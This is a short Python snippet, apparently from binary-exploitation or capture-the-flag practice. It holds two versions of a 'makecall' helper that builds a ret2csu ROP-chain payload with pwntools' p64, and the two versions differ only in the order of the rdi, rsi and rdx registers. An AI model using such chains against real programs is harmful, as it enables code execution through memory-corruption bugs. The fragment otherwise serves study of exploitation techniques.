

#1
def makecall(addr, rdi, rsi, rdx, tail = 0):
    payload = ''
    payload += p64(p6_addr)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(addr)
    payload += p64(rdi)
    payload += p64(rsi)
    payload += p64(rdx)
    payload += p64(call_addr)
    if (tail):
        payload += p64(0x0) * 7 + p64(tail)
    return payload

#2
def makecall(addr, rdi, rsi, rdx, tail = 0):
    payload = ''
    payload += p64(p6_addr)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(addr)
    payload += p64(rdx)
    payload += p64(rsi)
    payload += p64(rdi)
    payload += p64(call_addr)
    if (tail):
        payload += p64(0x0) * 7 + p64(tail)
    return payload